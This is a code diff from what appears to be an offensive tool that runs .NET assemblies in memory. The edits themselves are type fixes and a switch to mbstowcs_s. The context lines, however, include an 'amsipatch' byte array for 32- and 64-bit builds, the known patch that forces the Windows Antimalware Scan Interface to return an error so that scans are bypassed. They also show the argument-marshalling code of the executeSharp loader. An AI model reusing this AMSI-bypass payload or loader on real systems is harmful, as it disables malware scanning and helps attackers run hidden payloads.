@@ -20,11 +20,11 @@ char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
 char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
 
 #ifdef _X32
-char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 SIZE_T patchsize = 6;
 #endif
 #ifdef _X64
-char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 SIZE_T patchsize = 6;
 #endif
 
@@ -208,7 +208,7 @@ int executeSharp(LPVOID lpPayload)
 
 		int arg_n = 1;
 		//Parameters number
-		for (int i = 0; i < strlen((char*)arg_s); i++)
+		for (int i = 0; i < ((int)strlen((char*)arg_s)); i++)
 		{
 			if (arg_s[i] == ' ')
 				arg_n++;
@@ -219,14 +219,17 @@ int executeSharp(LPVOID lpPayload)
 
 		char delim[] = " ";
 		char *next_token = NULL;
-		char *ptr = strtok_s((char*)arg_s, delim, &next_token);
+		const char *ptr = strtok_s((char*)arg_s, delim, &next_token);
 
 		long i = 0;
 		//Wallking parameters
 		while (i < arg_n && ptr != NULL)
 		{
+			size_t strlength = strlen(ptr) + 1;
 			OLECHAR *sOleText1 = new OLECHAR[strlen(ptr) + 1];
-			hr = mbstowcs(sOleText1, ptr, strlen(ptr) + 1);
+			//mbstowcs(sOleText1, ptr, strlen(ptr) + 1);
+			size_t converted;
+			mbstowcs_s(&converted, sOleText1, strlength, ptr, strlength);
 			BSTR strParam1 = SysAllocString(sOleText1);
 
 			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
